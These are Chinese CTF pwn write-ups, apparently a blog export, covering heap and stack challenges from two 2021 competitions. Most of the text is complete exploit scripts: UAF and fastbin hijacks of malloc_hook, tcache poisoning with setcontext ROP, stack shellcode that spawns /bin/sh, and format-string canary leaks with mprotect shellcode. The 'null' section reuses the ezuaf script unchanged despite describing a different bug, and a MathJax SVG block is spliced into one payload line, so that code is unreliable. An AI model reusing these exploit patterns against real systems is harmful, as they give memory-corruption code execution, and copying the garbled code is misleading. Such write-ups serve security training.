<p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20211001115859860.png"><span class="image-caption">image-20211001115859860</span></p>
<h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png"><span class="image-caption">image-20210929173017054</span></p>
<p>如题名字，存在UAF，借着UAF泄露libc地址，然后直接修改释放fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png"><span class="image-caption">image-20210929173224666</span></p>
<p>在申请功能里面的输入点存在很明显的offbyone，通过offbyone制造overlap，可以泄露出libc，然后修改被重叠的fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png"><span class="image-caption">image-20210929172949043</span></p>
<p>程序存在UAF，借着UAF把堆块劫持到tcache上，获得libc，同时修改tcache结构，获得任意地址写</p>
<p>因为开了沙箱，所以堆上布置rop链进行orw</p>
<p>最后释放堆块触发setcontext去执行到rop</p>
<p>嘿嘿，经过一段时间的学习，总算掌握了这种在堆上布置rop链的手法了，该去学习新的知识了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021九月DASCTF</title>
    <url>/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛其实是没抱着很认真的态度去打的，可能由于一贯的印象，下意识觉得安恒月赛，不是我这种小菜鸡能看的，毕竟从去年年尾学到现在，这种比赛我都是来凑人头的。但是这次，可惜了，后面看了下师傅的wp，发现，竟然不难，所以出篇博客复现一下吧，这是到目前为止，唯一全部pwn题都是我能做的了，也许，这就是进步了吧，岁月漫长，值得期待！</p>
<p>来源：<a href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p>
<h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png"><span class="image-caption">image-20210928152753508</span></p>
<p>常规checksec，64位保护全没开，第一想法就是执行shellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png"><span class="image-caption">image-20210928152907622</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png"><span class="image-caption">image-20210928152921816</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png"><span class="image-caption">image-20210928152851336</span></p>
<p>首先，会有个输入点，并且还会打印我们输入的内容，只要我们输入满0x20个字符，就会连着rbp一起泄露出来，获取到栈上地址，后面还贴心的给了栈溢出。</p>
<p>那就明确了：栈上写入shellcode，借用得到来的栈上地址算出shellcode写入的地址，将这个地址填充到返回地址去，然后执行shellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png"><span class="image-caption">image-20210928153222539</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png"><span class="image-caption">image-20210928145300688</span></p>
<p>常规checksec，64位，没开PIE，RELRO也没开全</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png"><span class="image-caption">image-20210928145345926</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png"><span class="image-caption">image-20210928145402864</span></p>
<p>程序也十分简单，但是开了沙箱，所以是orw。给了格式化字符串，用来泄露canary的，以及一个明显栈溢出。</p>
<p>所以思路很明确的，也很简单，就是通过格式化字符串泄露出canary，其实由于长度够，还能再多泄露一个寄存器或者栈上存储的函数地址，从而获取libc地址，然后呢，这边泄露的选择寄存器上的没问题，刚开始我是选择栈上的stdin，然后发现远程这个打印出来是空的</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png"><span class="image-caption">image-20210928152412946</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png"><span class="image-caption">image-20210928152432248</span></p>
<p>换成寄存器上的libc地址就行了。拥有了libc和canary后就可以着手布置rop了，我的做法是使用mprotect修改权限然后跳转到read函数进行写入shellcode，最后跳转shellcode执行读取flag。师傅的做法就是直接用rop进行open，read，write的调用读取flag</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png"><span class="image-caption">image-20210928152051899</span></p>
<p>这题有点坑，看了师傅的wp也知道了，环境有点问题，官方给的附件里的libc版本是跟远程靶机差了一个小版本的，把libc换成2.23-0ubuntu11.3即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">p%27</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
</g>
</svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



